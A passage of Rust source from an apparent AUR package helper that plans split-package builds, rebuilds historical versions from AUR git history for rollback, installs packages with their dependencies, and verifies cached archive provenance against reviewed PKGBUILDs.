    ) -> Result<Vec<BuildJob>> {
        let requested: BTreeSet<&str> = packages.iter().map(String::as_str).collect();
        let mut info_by_name = BTreeMap::new();
        let mut base_by_output = BTreeMap::new();

        for info in package_info {
            crate::core::security::validate_package_name(&info.name)
                .context("AUR returned an invalid split-package name")?;
            let package_base = info.package_base.as_deref().unwrap_or(&info.name);
            crate::core::security::validate_package_name(package_base)
                .context("AUR returned an invalid package base")?;
            info_by_name.insert(info.name.as_str(), info);
            base_by_output.insert(info.name.as_str(), package_base);
        }

        let mut outputs_by_base: BTreeMap<&str, BTreeSet<String>> = BTreeMap::new();
        let mut dependencies_by_base: BTreeMap<&str, BTreeSet<String>> = BTreeMap::new();

        for package in packages {
            let info = info_by_name
                .get(package.as_str())
                .with_context(|| format!("AUR returned no package information for '{package}'"))?;
            let package_base = base_by_output[info.name.as_str()];
            outputs_by_base
                .entry(package_base)
                .or_default()
                .insert(info.name.clone());

            for dependency in info
                .depends
                .iter()
                .chain(info.make_depends.iter())
                .chain(info.check_depends.iter())
                .flatten()
            {
                let dependency = dependency_name(dependency);
                if !requested.contains(dependency) {
                    continue;
                }
                let dependency_base = base_by_output.get(dependency).with_context(|| {
                    format!("AUR returned no package information for dependency '{dependency}'")
                })?;
                if *dependency_base != package_base {
                    dependencies_by_base
                        .entry(package_base)
                        .or_default()
                        .insert((*dependency_base).to_string());
                }
            }
        }

        Ok(outputs_by_base
            .into_iter()
            .map(|(package_base, outputs)| {
                let dependencies = dependencies_by_base
                    .remove(package_base)
                    .unwrap_or_default()
                    .into_iter()
                    .collect();
                BuildJob::for_package_base(
                    package_base.to_string(),
                    outputs.into_iter().collect(),
                    dependencies,
                )
            })
            .collect())
    }

    fn rollback_worktree_name(base: &str) -> String {
        format!("{base}-{}", uuid::Uuid::new_v4())
    }

    fn historical_version_not_found_message(base: &str, version: &str) -> String {
        format!(
            "version {version} of '{base}' was not found in the AUR git history (the repository may have been force-pushed since it was installed)"
        )
    }

    fn historical_build_failure_message(package: &str, version: &str, log_path: &Path) -> String {
        format!(
            "Historical build of {package} {version} failed; check {}\n  → The AUR may no longer support building this version (changed sources/dependencies)",
            log_path.display()
        )
    }

    /// Rebuild `package` at historical `version` from the AUR repository's
    /// git history and install the resulting archive.
    ///
    /// Used by rollback: officials restore from the pacman cache, but AUR
    /// serves only latest builds, so downgrading requires checking out the
    /// commit whose `.SRCINFO` recorded the old version. The clone is fully
    /// isolated under `_rollback/` so the user's cached checkout is never
    /// touched, and no build-cache key is written (this is not the latest
    /// build).
    pub async fn downgrade_from_history(&self, package: &str, version: &str) -> Result<()> {
        crate::core::security::validate_package_name(package)?;
        crate::core::security::validate_version(version)?;
        require_unprivileged_builder(package, crate::core::is_root())?;
        Self::preacquire_install_privileges(package, "AUR rollback").await?;
        let sudoloop = if crate::core::sudoloop::can_use_sudoloop() {
            Some(crate::core::sudoloop::SudoLoop::start())
        } else {
            None
        };

        let base = self.resolve_package_base(package).await?;

        // Isolated work tree; a UUID prevents concurrent rollbacks of the
        // same package base from sharing or deleting one another's checkout.
        let work = self.build_dir.join("_rollback");
        create_dir_as_user(&work).await?;
        let repo_dir = work.join(Self::rollback_worktree_name(&base));
        create_dir_as_user(&repo_dir).await?;

        // Full-history partial clone (blobs fetched on demand at checkout).
        let url = format!("{AUR_GIT_URL}/{base}.git");
        let clone = Command::new("git")
            .args([
                "clone",
                "--filter=blob:none",
                "--",
                &url,
                repo_dir.to_string_lossy().as_ref(),
            ])
            .env("GIT_TERMINAL_PROMPT", "0")
            .stdin(Stdio::null())
            .output()
            .await;
        match clone {
            Ok(output) if output.status.success() => {}
            Ok(output) => {
                let stderr = String::from_utf8_lossy(&output.stderr);
                anyhow::bail!(
                    "Failed to clone AUR history for '{base}': {}",
                    stderr.trim()
                );
            }
            Err(error) => {
                anyhow::bail!("git is required for AUR version rollback: {error}");
            }
        }

        // Walk commits newest -> oldest looking for the recorded version.
        let shas = Command::new("git")
            .args(["-C"])
            .arg(&repo_dir)
            .args(["log", "--format=%H"])
            .env("GIT_TERMINAL_PROMPT", "0")
            .stdin(Stdio::null())
            .output()
            .await
            .context("Failed to list AUR repository history")?;
        if !shas.status.success() {
            anyhow::bail!(
                "Failed to list AUR history for '{base}': {}",
                String::from_utf8_lossy(&shas.stderr).trim()
            );
        }
        let sha_list = String::from_utf8_lossy(&shas.stdout);
        let mut matched_sha: Option<String> = None;
        for sha in sha_list.lines().map(str::trim).filter(|s| !s.is_empty()) {
            let show = Command::new("git")
                .args(["-C"])
                .arg(&repo_dir)
                .args(["show", &format!("{sha}:.SRCINFO")])
                .env("GIT_TERMINAL_PROMPT", "0")
                .stdin(Stdio::null())
                .output()
                .await
                .context("Failed to read .SRCINFO from history")?;
            if !show.status.success() {
                continue; // commit predates .SRCINFO generation or blob gone
            }
            let content = String::from_utf8_lossy(&show.stdout);
            if Self::srcinfo_version(&content).as_deref() == Some(version) {
                matched_sha = Some(sha.to_string());
                break;
            }
        }

        let Some(sha) = matched_sha else {
            anyhow::bail!(
                "{}",
                Self::historical_version_not_found_message(&base, version)
            );
        };

        let checkout = Command::new("git")
            .args(["-C"])
            .arg(&repo_dir)
            .args(["checkout", "--detach", &sha])
            .env("GIT_TERMINAL_PROMPT", "0")
            .stdin(Stdio::null())
            .status()
            .await
            .context("Failed to checkout historical commit")?;
        if !checkout.success() {
            anyhow::bail!("Failed to checkout commit {sha} of '{base}'");
        }

        // Use the same hardened validation, environment, and sandboxing
        // pipeline as regular installs.
        let pkg_dir = validate_build_dir(
            repo_dir
                .parent()
                .context("rollback work dir must have a parent")?,
            repo_dir
                .file_name()
                .and_then(std::ffi::OsStr::to_str)
                .context("rollback work dir name must be valid UTF-8")?,
        )?;

        let mut env = self.makepkg_env(&pkg_dir).await?;
        // SECURITY (audit F-03, second wave): a force-pushed history commit
        // is exactly as untrusted as a fresh build, and the version match
        // alone does not prove the PKGBUILD is the one originally installed.
        // ALWAYS show the review prompt during rollback rebuilds,
        // independent of the user's day-to-day review preference.
        let pkgbuild_path = pkg_dir.join("PKGBUILD");
        let reviewed_digest = Self::review_pkgbuild(package, &pkgbuild_path).await?;
        env.pgp_home = Self::fetch_missing_pgp_keys(&pkgbuild_path).await?;
        println!(
            "  {} Building {package} {version} from history...",
            crate::cli::style::informative("→")
        );
        verify_reviewed_pkgbuild(&pkgbuild_path, &reviewed_digest)?;
        let status = self
            .run_build(&pkg_dir, &env, package)
            .await
            .with_context(|| format!("Failed to run makepkg for '{package}'"))?;
        if !status.success() {
            anyhow::bail!(
                "{}",
                Self::historical_build_failure_message(
                    package,
                    version,
                    &self.build_dir.join("_logs"),
                )
            );
        }

        let mut archives =
            Self::find_built_packages(&pkg_dir, &env.pkgdest, &[package.to_string()])
                .await
                .map_err(|_| AurError::PackageArchiveNotFound(package.to_string()))?;
        let Some(archive) = archives.pop() else {
            return Err(AurError::PackageArchiveNotFound(package.to_string()).into());
        };

        crate::cli::modern_ui::print_info(&format!("Installing {package} {version}"));
        Self::install_built_packages(&[archive], sudoloop.as_ref()).await?;
        crate::cli::modern_ui::print_success(&format!("Installed {package} {version}"));
        // The historical checkout is reproducible from AUR history on demand;
        // leaving every UUID-named worktree behind would grow the build dir
        // without bound. Removal is best-effort: a leftover checkout never
        // affects correctness, only disk use.
        if let Err(error) = tokio::fs::remove_dir_all(&repo_dir).await {
            tracing::warn!(
                "Rollback of '{package}' succeeded but its worktree {} could not be removed: {error:#}",
                repo_dir.display()
            );
        }
        Ok(())
    }

    /// Extract `pkgver-pkgrel` from `.SRCINFO` text (first occurrences).
    fn srcinfo_version(content: &str) -> Option<String> {
        let mut epoch: Option<&str> = None;
        let mut pkgver: Option<&str> = None;
        let mut pkgrel: Option<&str> = None;
        for line in content.lines() {
            let Some((key, value)) = line.split_once('=') else {
                continue;
            };
            match key.trim() {
                "epoch" if epoch.is_none() => epoch = Some(value.trim()),
                "pkgver" if pkgver.is_none() => pkgver = Some(value.trim()),
                "pkgrel" if pkgrel.is_none() => pkgrel = Some(value.trim()),
                _ => {}
            }
        }
        let prefix = epoch
            .filter(|value| !value.is_empty())
            .map_or_else(String::new, |value| format!("{value}:"));
        match (pkgver, pkgrel) {
            (Some(v), Some(r)) => Some(format!("{prefix}{v}-{r}")),
            (Some(v), None) => Some(format!("{prefix}{v}")),
            _ => None,
        }
    }

    pub async fn install(&self, package: &str) -> Result<()> {
        crate::core::security::validate_package_name(package)?;
        // Build the package *base* (split packages share one PKGBUILD and one
        // checkout), but install only the output the user asked for. Installing
        // every sibling output of the base would mutate the system beyond the
        // request.
        let requested = vec![package.to_string()];
        let mut jobs = self.build_jobs_for_updates(&requested).await?;
        let job = jobs
            .pop()
            .context("AUR returned no build plan for the requested package")?;
        self.install_package_outputs(&job.package, &[package.to_string()])
            .await
    }

    pub(crate) async fn preacquire_install_privileges(package: &str, purpose: &str) -> Result<()> {
        if crate::core::caps::can_write_pacman_db() {
            return Ok(());
        }

        if !console::user_attended() {
            let status = tokio::process::Command::new("sudo")
                .args(["-n", "true"])
                .stdin(std::process::Stdio::null())
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .status()
                .await
                .context("Failed to check non-interactive sudo availability")?;
            if !status.success() {
                anyhow::bail!(
                    "{purpose} for '{package}' needs sudo, but this non-interactive session does not have passwordless sudo"
                );
            }
        }

        let status = tokio::process::Command::new("sudo")
            .arg("-v")
            .stdin(std::process::Stdio::inherit())
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::inherit())
            .status()
            .await
            .with_context(|| format!("Failed to acquire sudo credentials for {purpose}"))?;
        if !status.success() {
            anyhow::bail!("Failed to acquire sudo credentials for {purpose} of '{package}'");
        }
        Ok(())
    }

    pub(crate) async fn authorize_package_outputs(
        &self,
        package: &str,
        requested_outputs: &[String],
    ) -> Result<AuthorizedBuild> {
        crate::core::security::validate_package_name(package)?;
        if requested_outputs.is_empty() {
            anyhow::bail!("AUR build plan for '{package}' has no package outputs");
        }
        for output in requested_outputs {
            crate::core::security::validate_package_name(output)?;
        }
        require_unprivileged_builder(package, crate::core::is_root())?;

        let package_lock = self.package_base_lock(package);
        let _package_checkout_guard = package_lock.lock().await;
        create_dir_as_user(&self.build_dir).await?;
        let _package_checkout_file_guard = self.acquire_package_base_file_lock(package).await?;
        let pkg_dir = validate_build_dir(&self.build_dir, package)?;

        if pkg_dir.exists() {
            let pull_pb =
                crate::cli::modern_ui::modern_spinner("Updating", &format!("{package} source"));
            if let Err(error) = self.git_pull(&pkg_dir).await {
                crate::cli::modern_ui::finish_clear(&pull_pb);
                tracing::warn!(
                    "Git pull failed for {package}: {error}. Recovering by recloning package repository."
                );
                remove_dir_as_user(&pkg_dir)
                    .await
                    .map_err(|cleanup_error| {
                        tracing::warn!(
                            "Failed to remove stale AUR cache for {package}: {cleanup_error}"
                        );
                        AurError::GitPullFailed(package.to_string())
                    })?;
                let recover_pb = crate::cli::modern_ui::modern_spinner(
                    "Recovering",
                    &format!("{package} source checkout"),
                );
                self.git_clone(package).await.map_err(|clone_error| {
                    crate::cli::modern_ui::finish_clear(&recover_pb);
                    tracing::warn!("Recovery clone failed for {package}: {clone_error}");
                    AurError::GitPullFailed(package.to_string())
                })?;
                crate::cli::modern_ui::finish_success(&recover_pb, "Recovered", "source checkout");
            } else {
                crate::cli::modern_ui::finish_success(
                    &pull_pb,
                    "Updated",
                    &format!("{package} source"),
                );
            }
        } else {
            let clone_pb =
                crate::cli::modern_ui::modern_spinner("Cloning", &format!("{package} from AUR"));
            self.git_clone(package).await.map_err(|error| {
                crate::cli::modern_ui::finish_clear(&clone_pb);
                tracing::warn!("Git clone failed for {package}: {error}");
                AurError::GitCloneFailed(package.to_string())
            })?;
            crate::cli::modern_ui::finish_success(
                &clone_pb,
                "Cloned",
                &format!("{package} repository"),
            );
        }

        let pkgbuild_path = pkg_dir.join("PKGBUILD");
        if !pkgbuild_path.exists() {
            return Err(AurError::PkgbuildNotFound(package.to_string()).into());
        }
        let reviewed_digest = if self.settings.aur.review_pkgbuild {
            Some(Self::review_pkgbuild(package, &pkgbuild_path).await?)
        } else {
            None
        };

        Ok(AuthorizedBuild {
            package: package.to_string(),
            requested_outputs: requested_outputs.to_vec(),
            reviewed_digest,
        })
    }

    pub(crate) async fn install_package_outputs(
        &self,
        package: &str,
        requested_outputs: &[String],
    ) -> Result<()> {
        let authorized = self
            .authorize_package_outputs(package, requested_outputs)
            .await?;
        Self::preacquire_install_privileges(&authorized.package, "AUR build").await?;
        let sudoloop = if crate::core::sudoloop::can_use_sudoloop() {
            tracing::debug!("Starting sudoloop for AUR build");
            Some(crate::core::sudoloop::SudoLoop::start())
        } else {
            None
        };
        self.install_authorized_package_outputs(authorized, sudoloop.as_ref())
            .await
    }

    pub(crate) async fn install_authorized_package_outputs(
        &self,
        authorized: AuthorizedBuild,
        sudoloop: Option<&crate::core::sudoloop::SudoLoop>,
    ) -> Result<()> {
        let AuthorizedBuild {
            package,
            requested_outputs,
            reviewed_digest,
        } = authorized;
        let package_lock = self.package_base_lock(&package);
        let package_checkout_guard = package_lock.lock().await;
        let package_checkout_file_guard = self.acquire_package_base_file_lock(&package).await?;
        let pkg_dir = validate_build_dir(&self.build_dir, &package)?;
        let pkgbuild_path = pkg_dir.join("PKGBUILD");
        if !pkgbuild_path.exists() {
            return Err(AurError::PkgbuildNotFound(package).into());
        }
        if let Some(digest) = &reviewed_digest {
            verify_reviewed_pkgbuild(&pkgbuild_path, digest)?;
        }

        let pgp_home = Self::fetch_missing_pgp_keys(&pkgbuild_path).await?;

        let mut env = self.makepkg_env(&pkg_dir).await?;
        env.pgp_home = pgp_home;

        let dependency_plan = self
            .aur_dependency_plan(&pkg_dir, &package, &requested_outputs)
            .await?;
        let requested_outputs = dependency_plan.package_outputs;
        let mut dependency_builds =
            AHashSet::from_iter([package.clone(), Self::package_base_marker(&package)]);
        drop(package_checkout_file_guard);
        drop(package_checkout_guard);
        Self::install_official_dependencies(&dependency_plan.official_dependencies).await?;
        for dep in dependency_plan.aur_dependencies {
            crate::cli::modern_ui::print_info(&format!(
                "Installing AUR dependency for {package}: {dep}"
            ));
            let dep_packages = self
                .build_only(&dep, &mut dependency_builds, sudoloop)
                .await?;
            Self::install_built_packages(&dep_packages, sudoloop).await?;
            crate::cli::modern_ui::print_success(&format!("Installed dependency: {dep}"));
        }
        Self::ensure_dependencies_satisfied(&pkg_dir, &requested_outputs).await?;

        let _package_build_guard = package_lock.lock().await;
        let _package_build_file_guard = self.acquire_package_base_file_lock(&package).await?;

        // Best-effort pre-download: makepkg still fetches anything we miss.
        match parse_sources(&pkg_dir) {
            Ok(sources) if sources.is_empty() => {}
            Ok(sources) => {
                let summary = download_sources(sources, &env.srcdest).await;
                if summary.failed > 0 {
                    tracing::warn!(
                        "Pre-downloaded {}/{} AUR sources for {package}; makepkg will retry the rest",
                        summary.succeeded,
                        summary.succeeded + summary.failed
                    );
                }
            }
            Err(error) => {
                tracing::warn!(
                    "Failed to parse AUR sources for {package}: {error}; makepkg will fetch them"
                );
            }
        }

        let cache_key = self.cache_key(&pkg_dir, &env.makeflags)?;

        let cached = self
            .cached_artifacts(
                &package,
                &requested_outputs,
                &pkg_dir,
                &env.pkgdest,
                &cache_key,
            )
            .await?;
        let mut pkg_files = match cached {
            Some(archives) => {
                crate::cli::modern_ui::print_info(&format!("Using cached build for {package}"));
                archives
            }
            None => Vec::new(),
        };

        if pkg_files.is_empty() {
            if let Some(digest) = &reviewed_digest {
                verify_reviewed_pkgbuild(&pkgbuild_path, digest)?;
            }
            let log_path = self.build_log_path(&package);

            let status = self
                .run_build(&pkg_dir, &env, &package)
                .await
                .with_context(|| format!("Failed to run makepkg for '{package}'"))?;

            if !status.success() {
                return Err(AurError::BuildFailed {
                    package: package.clone(),
                    log_path: log_path.display().to_string(),
                }
                .into());
            }

            pkg_files = Self::find_built_packages(&pkg_dir, &env.pkgdest, &requested_outputs)
                .await
                .map_err(|_| AurError::PackageArchiveNotFound(package.clone()))?;
            self.write_cache_key(&package, &cache_key).await?;
        }

        let output_names = requested_outputs.join(", ");
        crate::cli::modern_ui::print_info(&format!("Installing {output_names}"));
        Self::install_built_packages(&pkg_files, sudoloop).await?;
        crate::cli::modern_ui::print_success(&format!("Installed {output_names}"));

        Ok(())
    }

    fn build_only<'a>(
        &'a self,
        package: &'a str,
        in_flight: &'a mut AHashSet<String>,
        sudoloop: Option<&'a crate::core::sudoloop::SudoLoop>,
    ) -> BoxFuture<'a, Result<Vec<PathBuf>>> {
        async move {
            Self::enter_dependency_build(in_flight, package)?;
            let package_base = match self.resolve_package_base(package).await {
                Ok(package_base) => package_base,
                Err(error) => {
                    in_flight.remove(package);
                    return Err(error);
                }
            };
            let base_marker = Self::package_base_marker(&package_base);
            if let Err(error) = Self::enter_package_base(in_flight, &package_base) {
                in_flight.remove(package);
                return Err(error);
            }

            let result = self
                .build_only_inner(package, &package_base, in_flight, sudoloop)
                .await;
            in_flight.remove(&base_marker);
            in_flight.remove(package);
            result
        }
        .boxed()
    }

    fn enter_dependency_build(in_flight: &mut AHashSet<String>, package: &str) -> Result<()> {
        if !in_flight.insert(package.to_string()) {
            anyhow::bail!("Circular AUR dependency detected while resolving '{package}'");
        }
        Ok(())
    }

    fn enter_package_base(in_flight: &mut AHashSet<String>, package_base: &str) -> Result<()> {
        if !in_flight.insert(Self::package_base_marker(package_base)) {
            anyhow::bail!(
                "Circular AUR package-base dependency detected while resolving '{package_base}'"
            );
        }
        Ok(())
    }

    #[instrument(skip(self, in_flight, sudoloop))]
    async fn build_only_inner(
        &self,
        package: &str,
        package_base: &str,
        in_flight: &mut AHashSet<String>,
        sudoloop: Option<&crate::core::sudoloop::SudoLoop>,
    ) -> Result<Vec<PathBuf>> {
        crate::core::security::validate_package_name(package)?;
        let package_lock = self.package_base_lock(package_base);
        let package_checkout_guard = package_lock.lock().await;

        // A dependency may be a split-package OUTPUT whose AUR repository is
        // named after its package base (e.g. `postgresql18-libs` lives in
        // `postgresql18.git`). Clone/build the base; cache and artifact
        // lookups stay scoped to the requested output.
        create_dir_as_user(&self.build_dir).await?;
        let package_checkout_file_guard = self.acquire_package_base_file_lock(package_base).await?;

        // SECURITY: Validate package directory is safe (prevents symlink attacks)
        let pkg_dir = validate_build_dir(&self.build_dir, package_base)?;
        let pkgbuild_path = pkg_dir.join("PKGBUILD");

        if pkg_dir.exists() && pkgbuild_path.exists() {
            if let Err(e) = self.git_pull(&pkg_dir).await {
                tracing::warn!(
                    "Git pull failed for {}: {}. Recovering by recloning package repository.",
                    package_base,
                    e
                );
                remove_dir_as_user(&pkg_dir).await.map_err(|cleanup_err| {
                    tracing::warn!(
                        "Failed to remove stale AUR cache for {}: {}",
                        package_base,
                        cleanup_err
                    );
                    AurError::GitPullFailed(package_base.to_string())
                })?;
                self.git_clone(package_base).await.map_err(|clone_err| {
                    tracing::warn!("Recovery clone failed for {}: {}", package_base, clone_err);
                    AurError::GitPullFailed(package_base.to_string())
                })?;
            }
        } else {
            if pkg_dir.exists() {
                // Surface cleanup failures: otherwise a stale directory that
                // cannot be removed surfaces as a confusing clone failure.
                if let Err(error) = remove_dir_as_user(&pkg_dir).await {
                    tracing::warn!(
                        "Failed to remove stale AUR directory {} before re-cloning: {}",
                        pkg_dir.display(),
                        error
                    );
                }
            }
            self.git_clone(package_base).await.map_err(|e| {
                tracing::warn!("Git clone failed for {}: {}", package_base, e);
                AurError::GitCloneFailed(package_base.to_string())
            })?;
        }

        if !pkgbuild_path.exists() {
            return Err(AurError::PkgbuildNotFound(package.to_string()).into());
        }

        // Same hash seal as install_package_outputs: re-verify the reviewed
        // PKGBUILD right before this dependency build runs.
        let reviewed_digest = if self.settings.aur.review_pkgbuild {
            Some(Self::review_pkgbuild(package_base, &pkgbuild_path).await?)
        } else {
            None
        };
        let pgp_home = Self::fetch_missing_pgp_keys(&pkgbuild_path).await?;

        let dependency_plan = self
            .aur_dependency_plan(&pkg_dir, package, &[package.to_string()])
            .await?;
        let package_outputs = dependency_plan.package_outputs;
        drop(package_checkout_file_guard);
        drop(package_checkout_guard);
        Self::install_official_dependencies(&dependency_plan.official_dependencies).await?;
        for dependency in dependency_plan.aur_dependencies {
            crate::cli::modern_ui::print_info(&format!(
                "Installing AUR dependency for {package}: {dependency}"
            ));
            let archives = self.build_only(&dependency, in_flight, sudoloop).await?;
            Self::install_built_packages(&archives, sudoloop).await?;
            crate::cli::modern_ui::print_success(&format!("Installed dependency: {dependency}"));
        }
        Self::ensure_dependencies_satisfied(&pkg_dir, &package_outputs).await?;

        let _package_build_guard = package_lock.lock().await;
        let _package_build_file_guard = self.acquire_package_base_file_lock(package_base).await?;
        let mut env = self.makepkg_env(&pkg_dir).await?;
        env.pgp_home = pgp_home;
        let cache_key = self.cache_key(&pkg_dir, &env.makeflags)?;
        if let Some(archives) = self
            .cached_artifacts(
                package_base,
                &package_outputs,
                &pkg_dir,
                &env.pkgdest,
                &cache_key,
            )
            .await?
        {
            return Ok(archives);
        }

        if let Some(digest) = &reviewed_digest {
            verify_reviewed_pkgbuild(&pkgbuild_path, digest)?;
        }
        let log_path = self.build_log_path(package);
        let status = self
            .run_build(&pkg_dir, &env, package)
            .await
            .with_context(|| format!("Failed to run makepkg for '{package}'"))?;

        if !status.success() {
            return Err(AurError::BuildFailed {
                package: package.to_string(),
                log_path: log_path.display().to_string(),
            }
            .into());
        }

        let pkg_files = Self::find_built_packages(&pkg_dir, &env.pkgdest, &package_outputs)
            .await
            .map_err(|_| AurError::PackageArchiveNotFound(package.to_string()))?;
        self.write_cache_key(package_base, &cache_key).await?;
        Ok(pkg_files)
    }

    /// Resolve an AUR name (output or base) to its package base via one RPC
    /// lookup. Falls back to the input on any failure so offline callers keep
    /// their previous behavior instead of hard-failing.
    async fn resolve_package_base(&self, name: &str) -> Result<String> {
        match Self::rpc_info_chunk(std::slice::from_ref(&name.to_string())).await {
            Ok(response) => {
                let candidate = response
                    .results
                    .iter()
                    .find(|info| info.name == name)
                    .and_then(|info| info.package_base.as_deref());
                Self::validated_package_base(name, candidate)
            }
            Err(error) => {
                tracing::debug!(
                    "Could not resolve package base for {name}: {error}; using name as base"
                );
                Ok(name.to_string())
            }
        }
    }

    fn validated_package_base(name: &str, candidate: Option<&str>) -> Result<String> {
        let package_base = candidate.unwrap_or(name);
        crate::core::security::validate_package_name(package_base)
            .context("AUR returned an invalid package base")?;
        Ok(package_base.to_string())
    }

    async fn find_built_packages(
        pkg_dir: &Path,
        pkgdest: &Path,
        expected_names: &[String],
    ) -> Result<Vec<PathBuf>> {
        let pkg_dir = pkg_dir.to_path_buf();
        let pkgdest = pkgdest.to_path_buf();
        let expected_names = expected_names.to_vec();

        tokio::task::spawn_blocking(move || {
            let mut packages = Vec::with_capacity(expected_names.len());
            for expected_name in &expected_names {
                let names = [expected_name.clone()];
                let package = Self::find_package_in_dir(&pkgdest, &names)
                    .or_else(|| Self::find_package_in_dir(&pkg_dir, &names))
                    .with_context(|| {
                        format!(
                            "No package archive found for split-package output '{expected_name}'"
                        )
                    })?;
                packages.push(package);
            }
            Ok(packages)
        })
        .await?
    }

    /// Find every requested artifact in `path`, or `None` if any is missing.
    fn find_packages_in_dir_all(path: &Path, artifacts: &[String]) -> Option<Vec<PathBuf>> {
        let mut packages = Vec::with_capacity(artifacts.len());
        for artifact in artifacts {
            packages.push(Self::find_package_in_dir(
                path,
                std::slice::from_ref(artifact),
            )?);
        }
        Some(packages)
    }

    fn find_package_in_dir(path: &Path, expected_names: &[String]) -> Option<PathBuf> {
        let entries = std::fs::read_dir(path).ok()?;
        let mut best_match: Option<PathBuf> = None;
        let mut best_mtime = std::time::SystemTime::UNIX_EPOCH;

        for entry in entries.flatten() {
            let filename = entry.file_name().to_string_lossy().into_owned();
            if (filename.ends_with(".pkg.tar.zst") || filename.ends_with(".pkg.tar.xz"))
                && expected_names.iter().any(|name| {
                    filename.starts_with(name) && filename.chars().nth(name.len()) == Some('-')
                })
            {
                // Skip debug subpackages early
                if filename.contains("-debug-") || filename.contains("-debug.pkg.tar") {
                    continue;
                }

                // Filename matching is only a candidate filter. The archive's
                // embedded identity is authoritative; unreadable or absent
                // metadata must never select an artifact for installation.
                let Ok(Some(parsed_name)) = Self::pkg_name_from_archive(&entry.path()) else {
                    continue;
                };
                if !expected_names.iter().any(|name| name == &parsed_name) {
                    continue;
                }

                // If multiple matches (shouldn't happen), take newest by mtime
                if let Ok(meta) = entry.metadata() {
                    if let Ok(mtime) = meta.modified()
                        && mtime > best_mtime
                    {
                        best_mtime = mtime;
                        best_match = Some(entry.path());
                    }
                } else if best_match.is_none() {
                    best_match = Some(entry.path());
                }
            }
        }
        best_match
    }

    fn pkg_name_from_archive(path: &Path) -> Result<Option<String>> {
        Self::pkg_name_and_version_from_archive_result(path)
            .map(|identity| identity.map(|(name, _)| name))
    }

    /// Extract `(pkgname, full-version)` from `.PKGINFO` content.
    fn parse_pkginfo_name_version(content: &str) -> Option<(String, String)> {
        // Tolerant line parser: alpm-pkginfo's schema requires a dozen
        // mandatory fields; rollback/cache identity checks only need these
        // two keys and must work even when other metadata is absent.
        let mut name: Option<String> = None;
        let mut version: Option<String> = None;
        for line in content.lines() {
            let Some((key, value)) = line.split_once('=') else {
                continue;
            };
            match key.trim() {
                "pkgname" if name.is_none() => name = Some(value.trim().to_string()),
                "pkgver" if version.is_none() => version = Some(value.trim().to_string()),
                _ => {}
            }
        }
        Some((name?, version?))
    }

    /// Accept a complete, ordered set of cached outputs only when every
    /// archive's identity, version, package base, and install hook match the
    /// checkout. A matching cache key alone is not proof: both the key and
    /// archives live in a user-writable directory.
    fn select_cached_artifacts(
        archives: Vec<PathBuf>,
        outputs: &[String],
        pkg_dir: &Path,
        package_base: &str,
    ) -> Option<Vec<PathBuf>> {
        if outputs.is_empty()
            || archives.len() != outputs.len()
            || !archives.iter().zip(outputs).all(|(archive, output)| {
                Self::cached_artifact_provenance_ok(archive, pkg_dir, package_base, output)
            })
        {
            tracing::warn!(
                "Rejecting cached build for {package_base}: incomplete outputs or archive identity/provenance mismatch"
            );
            return None;
        }
        Some(archives)
    }

    /// Provenance proof for one cached archive (SEC-R2-01): a cached
    /// artifact may only be installed when it was demonstrably produced by
    /// the exact reviewed PKGBUILD. The archive's embedded .PKGINFO must
    /// match the fetched .SRCINFO (pkgname, pkgbase, pkgver-pkgrel) and its
    /// embedded .INSTALL hook must be byte-identical to the install script
    /// the reviewed PKGBUILD declares via `install=` (or absent when no
    /// install script is declared). Every missing or mismatched proof fails
    /// closed so the caller falls through to a fresh, reviewed rebuild — a
    /// poisoned cache is never silently trusted.
    fn cached_artifact_provenance_ok(
        archive: &Path,
        pkg_dir: &Path,
        package_base: &str,
        output: &str,
    ) -> bool {
        let srcinfo = match std::fs::read_to_string(pkg_dir.join(".SRCINFO")) {
            Ok(srcinfo) => srcinfo,
            Err(error) => {
                tracing::warn!(
                    "Cached artifact provenance for {output}: unreadable .SRCINFO in {}: {error}; rejecting cache hit",
                    pkg_dir.display()
                );
                return false;
            }
        };
        let Some(expected_version) = Self::srcinfo_version(&srcinfo) else {
            tracing::warn!(
                "Cached artifact provenance for {output}: .SRCINFO has no usable version; rejecting cache hit"
            );
            return false;
        };
        let Some(expected_base) = Self::srcinfo_pkgbase(&srcinfo) else {
            tracing::warn!(
                "Cached artifact provenance for {output}: .SRCINFO declares no pkgbase; rejecting cache hit"
            );
            return false;
        };
        if expected_base != package_base {
            tracing::warn!(
                "Cached artifact provenance for {output}: .SRCINFO pkgbase '{expected_base}' does not match package base '{package_base}'; rejecting cache hit"
            );
            return false;
        }

        let Some(identity) = (match Self::cached_archive_identity(archive) {
            Ok(identity) => identity,
            Err(error) => {
                tracing::warn!(
                    "Cached artifact provenance for {output}: cannot read metadata from {}: {error}; rejecting cache hit",
                    archive.display()
                );
                return false;
            }
        }) else {
            tracing::warn!(
                "Cached artifact provenance for {output}: {} has no readable .PKGINFO; rejecting cache hit",
                archive.display()
            );
            return false;
        };

        if identity.name != output
            || identity.version != expected_version
            || identity.base != package_base
        {
            tracing::warn!(
                "Cached artifact provenance for {output}: {} claims '{}' '{}' in base '{}', expected '{}' in base '{package_base}' from .SRCINFO; rejecting cache hit",
                archive.display(),
                identity.name,
                identity.version,
                identity.base,
                expected_version
            );
            return false;
        }

        match Self::srcinfo_install_script(&srcinfo, output) {
            Some(install_file) => {
                let Some(embedded) = identity.install_script.as_deref() else {
                    tracing::warn!(
                        "Cached artifact provenance for {output}: reviewed PKGBUILD declares install script '{install_file}' but {} embeds no .INSTALL; rejecting cache hit",
                        archive.display()
                    );
                    return false;
                };
                let expected = match std::fs::read_to_string(pkg_dir.join(&install_file)) {
                    Ok(expected) => expected,
                    Err(error) => {
                        tracing::warn!(
                            "Cached artifact provenance for {output}: cannot read declared install script {install_file}: {error}; rejecting cache hit"
                        );
                        return false;
                    }
                };
                if embedded.trim_end() != expected.trim_end() {
                    tracing::warn!(
                        "Cached artifact provenance for {output}: .INSTALL hook in {} does not match the reviewed install script '{install_file}'; rejecting cache hit",
                        archive.display()
                    );
                    return false;
                }
            }
            None if identity.install_script.is_some() => {
                tracing::warn!(
                    "Cached artifact provenance for {output}: reviewed PKGBUILD declares no install script but {} embeds a .INSTALL hook; rejecting cache hit",
                    archive.display()
                );
                return false;
            }
            None => {}
        }

        true
    }

    /// Read `.PKGINFO` (and `.INSTALL` when present) from a package archive
    /// in a single bounded pass. Returns `Ok(None)` when the archive carries
    /// no `.PKGINFO` member at all.
    fn cached_archive_identity(archive: &Path) -> Result<Option<CachedArchiveIdentity>> {
        let reader = Self::package_archive_reader(archive, MAX_DECOMPRESSED_BYTES)?;
